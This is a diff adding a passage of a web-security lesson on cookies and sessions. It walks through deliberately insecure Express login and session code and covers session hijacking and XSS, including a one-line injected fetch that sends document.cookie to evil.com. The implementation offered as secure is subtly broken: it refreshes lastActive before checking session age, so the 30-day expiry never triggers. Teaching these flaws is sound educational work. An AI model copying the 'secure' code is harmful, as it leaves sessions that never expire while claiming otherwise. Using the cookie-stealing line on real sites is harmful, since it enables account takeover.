@@ -1,0 +1,372 @@
+<h1 id="lesson-5-cookies-and-sessions">Lesson 5: Cookies and
+Sessions</h1>
+<h2 id="introduction">Introduction</h2>
+<p>In previous lessons, we learned about core web technologies like
+HTTP, which is fundamentally a stateless protocol - each request is
+independent and the server doesn’t maintain any memory of previous
+requests. However, many web applications require maintaining state
+across multiple requests. For example:</p>
+<ul>
+<li>Users should be able to log in once and remain authenticated while
+browsing different pages</li>
+<li>Shopping carts need to persist items as users browse around an
+e-commerce site</li>
+<li>User preferences (like dark/light theme) should be remembered
+between visits</li>
+<li>Analytics systems need to track user behavior across multiple
+pages</li>
+<li>Multi-step forms need to maintain partially completed data</li>
+</ul>
+<p>This lesson covers how web applications maintain state using cookies
+and sessions, common security pitfalls when implementing them, and best
+practices for secure session management.</p>
+<h2 id="cookies-the-building-blocks-of-state">Cookies: The Building
+Blocks of State</h2>
+<p>Cookies are small pieces of data that servers can ask browsers to
+store and send back with future requests. They provide a mechanism for
+implementing “ambient authority” - access control based on a global and
+persistent property of the requester. While there are other methods of
+ambient authority on the web (IP checking, HTTP authentication, client
+certificates), cookies are by far the most common and versatile.</p>
+<p>Here’s how cookies work:</p>
+<ol type="1">
+<li>Server sends a response with a <code>Set-Cookie</code> header:</li>
+</ol>
+<pre class="http"><code>HTTP/1.1 200 OK
+Set-Cookie: username=alice
+Content-Type: text/html
+
+&lt;html&gt;...&lt;/html&gt;</code></pre>
+<ol start="2" type="1">
+<li>Browser stores the cookie and automatically includes it in future
+requests to the same site:</li>
+</ol>
+<pre class="http"><code>GET /profile HTTP/1.1
+Host: example.com
+Cookie: username=alice</code></pre>
+<p>The browser will continue to send this cookie with every request to
+example.com until the cookie expires or is deleted.</p>
+<h2 id="sessions-server-side-state-management">Sessions: Server-Side
+State Management</h2>
+<p>While cookies are the mechanism for maintaining state, sessions are
+how we actually organize and manage that state on the server side. A
+session represents a series of related interactions between a client and
+server.</p>
+<p>Let’s examine several approaches to implementing sessions, starting
+with naive implementations and building up to a secure solution.</p>
+<h3
+id="implementation-1-storing-username-in-cookie-insecure">Implementation
+1: Storing Username in Cookie (Insecure)</h3>
+<p>Here’s the simplest possible implementation:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Server-side user database</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> USERS <span class="op">=</span> {</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">alice</span><span class="op">:</span> <span class="st">&#39;password123&#39;</span><span class="op">,</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">bob</span><span class="op">:</span> <span class="st">&#39;hunter2&#39;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/login&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">;</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (password <span class="op">===</span> USERS[username]) {</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;username&#39;</span><span class="op">,</span> username)<span class="op">;</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/&#39;</span>)<span class="op">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>  } <span class="cf">else</span> {</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(<span class="st">&#39;Login failed!&#39;</span>)<span class="op">;</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username } <span class="op">=</span> req<span class="op">.</span><span class="at">cookies</span><span class="op">;</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (username) {</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`Welcome </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!`</span>)<span class="op">;</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>  } <span class="cf">else</span> {</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(loginForm)<span class="op">;</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>This is extremely insecure because users can simply modify their
+cookie to impersonate any user: 1. Log in as ‘alice’ 2. Edit cookie to
+say ‘username=bob’ 3. Now you’re logged in as Bob!</p>
+<h3 id="implementation-2-signed-cookies-still-insecure">Implementation
+2: Signed Cookies (Still Insecure)</h3>
+<p>We might try to prevent cookie tampering by signing the username:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> COOKIE_SECRET <span class="op">=</span> <span class="st">&#39;super-secret-key&#39;</span><span class="op">;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">use</span>(<span class="fu">cookieParser</span>(COOKIE_SECRET))<span class="op">;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/login&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (password <span class="op">===</span> USERS[username]) {</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;username&#39;</span><span class="op">,</span> username<span class="op">,</span> { <span class="dt">signed</span><span class="op">:</span> <span class="kw">true</span> })<span class="op">;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/&#39;</span>)<span class="op">;</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username } <span class="op">=</span> req<span class="op">.</span><span class="at">signedCookies</span><span class="op">;</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (username) {</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`Welcome </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!`</span>)<span class="op">;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>  } <span class="cf">else</span> {</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(loginForm)<span class="op">;</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>This prevents tampering, but has other problems: 1. The signed cookie
+becomes a permanent credential - even after logout, anyone with a copy
+of the cookie can impersonate that user 2. There is no way to invalidate
+sessions server-side. 3. There is no way to list or terminate active
+sessions.</p>
+<h3
+id="implementation-3-sequential-session-ids-still-insecure">Implementation
+3: Sequential Session IDs (Still Insecure)</h3>
+<p>Next attempt - generate session IDs and store the corresponding
+logged-in username server-side:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> nextSessionId <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> SESSIONS <span class="op">=</span> {}<span class="op">;</span> <span class="co">// sessionId -&gt; username</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/login&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (password <span class="op">===</span> USERS[username]) {</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    SESSIONS[nextSessionId] <span class="op">=</span> username<span class="op">;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;sessionId&#39;</span><span class="op">,</span> nextSessionId)<span class="op">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    nextSessionId <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> username <span class="op">=</span> SESSIONS[req<span class="op">.</span><span class="at">cookies</span><span class="op">.</span><span class="at">sessionId</span>]<span class="op">;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (username) {</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`Welcome </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!`</span>)<span class="op">;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>  } <span class="cf">else</span> {</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">send</span>(loginForm)<span class="op">;</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/logout&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>  <span class="kw">delete</span> SESSIONS[req<span class="op">.</span><span class="at">cookies</span><span class="op">.</span><span class="at">sessionId</span>]<span class="op">;</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">clearCookie</span>(<span class="st">&#39;sessionId&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>This is better in the sense that we can now invalidate sessions
+server-side if we wish, and we’re not storing sensitive data in cookies.
+However, this is worse in that session IDs are predictable: if your
+session ID is 5, you simply submit cookies with <code>sessionId</code>
+set to 1-4 to impersonate other users.</p>
+<h3 id="desired-properties-of-good-sessions">Desired Properties of Good
+Sessions</h3>
+<p>Before implementing a secure solution, let’s define what properties
+we want:</p>
+<ol type="1">
+<li><strong>Persistence</strong>: Browser remembers user authentication
+so they don’t need to repeatedly log in</li>
+<li><strong>Tamper resistance</strong>: Users cannot modify session data
+to impersonate other users</li>
+<li><strong>Server-side control</strong>: Sessions can be invalidated on
+the server side when needed (e.g. in the event of a security breach,
+account compromise, or change of account credentials)</li>
+<li><strong>Time-bounded</strong>: Sessions should expire after a
+reasonable time period</li>
+<li><strong>Revocable</strong>: Users should be able to terminate their
+own sessions (logout)</li>
+<li><strong>Secure transmission</strong>: Session data should be
+protected from eavesdropping</li>
+<li><strong>Multiple sessions</strong>: Users should be able to maintain
+multiple active sessions (e.g., mobile and desktop)</li>
+</ol>
+<h3 id="secure-session-implementation">Secure Session
+Implementation</h3>
+<p>Here’s a secure implementation that meets our desired properties:</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> { randomBytes } <span class="im">from</span> <span class="st">&#39;crypto&#39;</span><span class="op">;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> SESSIONS <span class="op">=</span> <span class="kw">new</span> <span class="bu">Map</span>()<span class="op">;</span> <span class="co">// sessionId -&gt; userData</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co">// Login endpoint: Check credentials and set cookie</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/login&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (<span class="fu">checkCredentials</span>(username<span class="op">,</span> password)) {</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Generate cryptographically secure random session ID</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> sessionId <span class="op">=</span> <span class="fu">randomBytes</span>(<span class="dv">32</span>)<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;hex&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Store session data server-side</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>    SESSIONS<span class="op">.</span><span class="fu">set</span>(sessionId<span class="op">,</span> {</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>      username<span class="op">,</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>      <span class="dt">lastActive</span><span class="op">:</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>()</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Set session cookie with security flags</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;sessionId&#39;</span><span class="op">,</span> sessionId<span class="op">,</span> {</span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>      <span class="dt">httpOnly</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span>   <span class="co">// Prevent JavaScript access</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>      <span class="dt">secure</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span>     <span class="co">// Prevent cookie from being sent over</span></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>                        <span class="co">// insecure network</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>      <span class="dt">sameSite</span><span class="op">:</span> <span class="st">&#39;lax&#39;</span><span class="op">,</span>  <span class="co">// Protect against CSRF (Lesson 6)</span></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/dashboard&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a><span class="co">// Dashboard endpoint: Read and validate cookie</span></span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/dashboard&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> sessionId <span class="op">=</span> req<span class="op">.</span><span class="at">cookies</span><span class="op">.</span><span class="at">sessionId</span><span class="op">;</span></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> session <span class="op">=</span> SESSIONS<span class="op">.</span><span class="fu">get</span>(sessionId)<span class="op">;</span></span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (<span class="op">!</span>session) {</span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>    <span class="co">// This is an invalid session ID</span></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/login&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Update last active timestamp</span></span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>  session<span class="op">.</span><span class="at">lastActive</span> <span class="op">=</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>()<span class="op">;</span></span>
+<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Check session age</span></span>
+<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> sessionAge <span class="op">=</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>() <span class="op">-</span> session<span class="op">.</span><span class="at">lastActive</span><span class="op">;</span></span>
+<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (sessionAge <span class="op">&gt;</span> <span class="dv">30</span> <span class="op">*</span> <span class="dv">24</span> <span class="op">*</span> <span class="dv">60</span> <span class="op">*</span> <span class="dv">60</span> <span class="op">*</span> <span class="dv">1000</span>) { <span class="co">// 30 days</span></span>
+<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a>    SESSIONS<span class="op">.</span><span class="fu">delete</span>(sessionId)<span class="op">;</span></span>
+<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">clearCookie</span>(<span class="st">&#39;sessionId&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>    res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/login&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">render</span>(<span class="st">&#39;dashboard&#39;</span><span class="op">,</span> { <span class="dt">username</span><span class="op">:</span> session<span class="op">.</span><span class="at">username</span> })<span class="op">;</span></span>
+<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/logout&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> sessionId <span class="op">=</span> req<span class="op">.</span><span class="at">cookies</span><span class="op">.</span><span class="at">sessionId</span><span class="op">;</span></span>
+<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a>  SESSIONS<span class="op">.</span><span class="fu">delete</span>(sessionId)<span class="op">;</span></span>
+<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">clearCookie</span>(<span class="st">&#39;sessionId&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">redirect</span>(<span class="st">&#39;/login&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<h2 id="session-hijacking-attacks">Session Hijacking Attacks</h2>
+<p>Session hijacking occurs when an attacker obtains a user’s session ID
+and uses it to impersonate them. There are several ways this can
+happen:</p>
+<h3 id="network-based-attacks">Network-Based Attacks</h3>
+<p>When HTTP traffic is unencrypted, attackers on the same network can
+intercept cookies. The infamous <a
+href="https://en.wikipedia.org/wiki/Firesheep">Firesheep Firefox
+extension (2010)</a> demonstrated this by making it trivially easy to
+hijack Facebook and Twitter sessions over public WiFi. The extension
+would: 1. Monitor network traffic for unencrypted requests to popular
+websites 2. Extract session cookies from these requests 3. Present a
+list of hijackable sessions to the attacker 4. Allow one-click
+impersonation of users</p>
+<p>This attack was particularly effective because many sites only
+encrypted their login pages, leaving subsequent requests unprotected,
+despite those requests including session cookies.</p>
+<p>Mitigation: 1. Use HTTPS everywhere to prevent eavesdropping 2. Set
+the <code>Secure</code> flag on cookies to prevent them from being sent
+over HTTP:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;sessionId&#39;</span><span class="op">,</span> sessionId<span class="op">,</span> { <span class="dt">secure</span><span class="op">:</span> <span class="kw">true</span> })<span class="op">;</span></span></code></pre></div>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p>Cookies are sent as request headers in every HTTP request. However,
+they are <em>also</em> readable by client-side JavaScript. There are
+legitimate use cases for this, e.g. saving a <code>theme</code> cookie
+for light/dark mode, if JavaScript is involved with rendering the
+site.</p>
+<p>However, if an attacker can inject JavaScript into your site, they
+can steal cookies:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Attacker&#39;s injected code</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://evil.com/steal?cookie=&#39;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span></span></code></pre></div>
+<p>We will discuss this type of attack in detail in Lesson 7.</p>
+<p>Mitigation: 1. Set the <code>HttpOnly</code> flag on session cookies
+to make them inaccessible to client JavaScript:</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;sessionId&#39;</span><span class="op">,</span> sessionId<span class="op">,</span> { <span class="dt">httpOnly</span><span class="op">:</span> <span class="kw">true</span> })<span class="op">;</span></span></code></pre></div>
+<ol start="2" type="1">
+<li>Implement proper XSS protections (covered in Lesson 7)</li>
+</ol>
+<h2 id="historical-context">Historical Context</h2>
+<p>Cookies were implemented in 1994 by Netscape and described in a brief
+4-page draft. Unlike most web technologies, they weren’t formally
+specified until much later:</p>
+<ul>
+<li>1994: Initial implementation in Netscape</li>
+<li>1997: First specification attempt, but made incompatible
+changes</li>
+<li>2000: “Cookie2” specification attempt, also unsuccessful</li>
+<li>2011: Finally standardized in RFC 6265</li>
+</ul>
+<p>This ad-hoc development process explains many of cookies’ quirks and
